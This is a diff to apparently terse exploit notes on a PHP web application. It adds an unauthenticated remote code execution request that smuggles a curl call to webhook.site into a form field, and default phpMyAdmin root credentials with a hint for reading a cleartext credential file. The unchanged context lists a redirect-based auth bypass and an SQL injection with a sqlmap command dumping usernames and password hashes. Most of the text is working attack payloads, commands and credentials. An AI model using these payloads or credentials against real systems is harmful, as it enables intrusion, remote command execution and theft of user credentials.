@@ -1,8 +1,28 @@
+------------------
 302 bypass on all php files
 web.php
 system.php
 etc..
 
+---
+
+Unauth RCE as www-data
+
+POST /programs/hamlibDo.php HTTP/1.1
+Host: xx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 112
+Connection: close
+Cookie: PHPSESSID=jdfe4gaiufdufss6n4g6h5f442
+
+test=1&user=$(curl+http%3a//webhook.site/xx/)
+
+------------------
 
 unauth SQL injection
 
@@ -22,3 +42,11 @@ radio=&folder=Inbox&order=Webdate&need=NG&sort=radio[SQLI]
 sqlmap -r req -p sort --random-agent --no-cast -D station -T Users -C Username,Password --dump --technique=TB --threads=10
 
 Password hashed in md5 so mostly crackable
+
+------------------
+
+default creds on /phpmyadmin root:7388
+
+you can read this file with the SQLi /var/www/html/programs/sqldata.php to find the phpmyadmin cred in cleartext
+
+
